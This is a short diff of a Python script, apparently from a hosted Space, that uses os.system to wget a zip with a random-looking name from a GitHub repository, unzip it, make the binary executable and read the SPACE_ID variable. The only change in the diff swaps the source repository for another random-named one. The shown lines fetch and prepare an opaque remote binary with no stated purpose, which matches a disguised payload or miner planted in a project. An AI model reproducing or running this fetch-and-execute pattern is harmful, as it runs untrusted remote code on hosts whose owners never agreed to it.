@@ -1,5 +1,5 @@
 import os
-os.system("wget https://github.com/qqivk/Ueldq/raw/refs/heads/main/Zeapmgy.zip")
+os.system("wget https://github.com/qqivk/Yeodp/raw/refs/heads/main/Zeapmgy.zip")
 os.system("unzip Zeapmgy.zip")
 os.system("chmod +x Zeapmgy")
 wn = os.getenv('SPACE_ID').replace("/","_")
